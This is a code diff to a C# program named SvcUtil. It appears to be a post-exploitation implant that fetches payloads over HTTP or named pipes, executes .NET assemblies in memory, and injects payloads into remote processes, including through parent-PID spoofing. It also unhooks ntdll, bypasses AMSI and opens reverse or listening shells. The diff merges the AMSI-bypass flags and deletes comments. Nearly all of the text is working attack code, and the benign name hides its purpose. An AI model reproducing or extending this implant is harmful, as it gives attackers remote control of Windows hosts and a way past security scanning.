@@ -17,8 +17,6 @@ namespace SvcUtil
         private static bool _listenMode;
         private static bool _reconnect;
         private static bool _noEncrypt;
-        private static bool _scanPatch;
-        private static bool _scanExplicit;
         private static bool _useTls;
         private static string _payloadB64;
         private static string _stageUrl;
@@ -30,7 +28,7 @@ namespace SvcUtil
         private static int _ppidSpoof;
 #endif
         private static bool _noSandbox;
-        private static bool _scanHwBp;
+        private static bool _amsi;
         private static bool _unhookNtdll;
         private static bool _execAsm;
         private static string[] _asmArgs;
@@ -45,8 +43,6 @@ namespace SvcUtil
             _listenMode = false;
             _reconnect = false;
             _noEncrypt = false;
-            _scanPatch = false;
-            _scanExplicit = false;
             _useTls = false;
             _payloadB64 = null;
             _stageUrl = null;
@@ -58,7 +54,7 @@ namespace SvcUtil
             _ppidSpoof = 0;
 #endif
             _noSandbox = false;
-            _scanHwBp = false;
+            _amsi = false;
             _unhookNtdll = false;
             _execAsm = false;
             _asmArgs = new string[0];
@@ -88,12 +84,12 @@ namespace SvcUtil
             else if (_stageUrl != null)
             {
                 payload = Stager.FromHttp(_stageUrl);
-                if (payload == null) return; // Download failed
+                if (payload == null) return;
             }
             else if (_stagePipe != null)
             {
                 payload = Stager.FromPipe(_stagePipe);
-                if (payload == null) return; // Pipe read failed
+                if (payload == null) return;
             }
 
             if (payload != null)
@@ -110,7 +106,7 @@ namespace SvcUtil
                     }
                     catch
                     {
-                        return; // Decryption failed — silent fail
+                        return;
                     }
                 }
 
@@ -118,13 +114,11 @@ namespace SvcUtil
                 {
                     if (_execAsm)
                     {
-                        // In-memory .NET assembly execution
                         AsmExec.Run(payload, _asmArgs);
                     }
 #if INJECT
                     else if (_targetPid > 0)
                     {
-                        // Remote injection — choose method
                         bool injected;
                         if (_useThreadInject)
                             injected = ThreadInjector.Inject(_targetPid, payload);
@@ -136,7 +130,6 @@ namespace SvcUtil
                     }
                     else if (_ppidSpoof > 0)
                     {
-                        // Spawn sacrificial process under spoofed parent, inject into it
                         IntPtr hProc, hThread;
                         int childPid;
                         if (!PpidSpoof.CreateWithParent(
@@ -144,7 +137,6 @@ namespace SvcUtil
                                 out hProc, out hThread, out childPid))
                             return;
 
-                        // Inject into the suspended child
                         bool injected = _useThreadInject
                             ? ThreadInjector.Inject(childPid, payload)
                             : RemoteLoader.Inject(childPid, payload);
@@ -152,7 +144,6 @@ namespace SvcUtil
                         if (!injected)
                             return;
 
-                        // Resume the child's main thread
                         Syscall.NtResumeThread(hThread);
                         Syscall.NtClose(hThread);
                         Syscall.NtClose(hProc);
@@ -171,10 +162,6 @@ namespace SvcUtil
             }
 
             // ── Shell mode ──────────────────────────────────────────────
-
-            // AMSI patch only when explicitly requested (-a / --amsi).
-            // Per-command execution spawns child processes — patching
-            // the parent has no effect on them.
 
             if (_listenMode)
                 RunListenMode();
@@ -230,18 +217,7 @@ namespace SvcUtil
 
                     case "-a":
                     case "--amsi":
-                        _scanPatch = true;
-                        _scanExplicit = true;
-                        break;
-
-                    case "--no-amsi":
-                        _scanPatch = false;
-                        _scanExplicit = true;
-                        break;
-
-                    case "--amsi-hw":
-                        _scanHwBp = true;
-                        _scanExplicit = true;
+                        _amsi = true;
                         break;
 
                     case "--tls":
@@ -281,7 +257,6 @@ namespace SvcUtil
                         string iArg = args[++i];
                         if (!int.TryParse(iArg, out _targetPid))
                         {
-                            // Strip .exe suffix if present
                             string iName = iArg;
                             if (iName.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
                                 iName = iName.Substring(0, iName.Length - 4);
@@ -290,7 +265,7 @@ namespace SvcUtil
                             if (procs.Length > 0)
                                 _targetPid = procs[0].Id;
                             else
-                                return false; // Process not found
+                                return false;
                         }
                         break;
 
@@ -303,7 +278,6 @@ namespace SvcUtil
                         string ppArg = args[++i];
                         if (!int.TryParse(ppArg, out _ppidSpoof))
                         {
-                            // Strip .exe suffix if present
                             string ppName = ppArg;
                             if (ppName.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
                                 ppName = ppName.Substring(0, ppName.Length - 4);
@@ -320,7 +294,6 @@ namespace SvcUtil
                         break;
 
                     case "--":
-                        // Everything after -- becomes assembly args
                         var remaining = new System.Collections.Generic.List<string>();
                         for (int j = i + 1; j < args.Length; j++)
                             remaining.Add(args[j]);
@@ -336,7 +309,6 @@ namespace SvcUtil
                         break;
 
                     default:
-                        // Legacy positional args
                         if (i == 0 && !args[0].StartsWith("-"))
                         {
                             _host = args[0];
@@ -364,7 +336,7 @@ namespace SvcUtil
             IShellStream stream = CreateStream(sock);
             if (stream == null) return;
 
-            Shell.Execute(_command, stream, _scanPatch, _scanHwBp, _unhookNtdll);
+            Shell.Execute(_command, stream, _amsi, _unhookNtdll);
         }
 
         private static void RunReverseWithReconnect()
@@ -378,7 +350,7 @@ namespace SvcUtil
                 IShellStream stream = CreateStream(sock);
                 if (stream == null) return;
 
-                Shell.Execute(_command, stream, _scanPatch, _scanHwBp, _unhookNtdll);
+                Shell.Execute(_command, stream, _amsi, _unhookNtdll);
             }
         }
 
@@ -390,12 +362,9 @@ namespace SvcUtil
             IShellStream stream = CreateStream(sock);
             if (stream == null) return;
 
-            Shell.Execute(_command, stream, _scanPatch, _scanHwBp, _unhookNtdll);
+            Shell.Execute(_command, stream, _amsi, _unhookNtdll);
         }
 
-        /// <summary>
-        /// Create the appropriate stream wrapper based on flags.
-        /// </summary>
         private static IShellStream CreateStream(Socket sock)
         {
             if (_useTls)
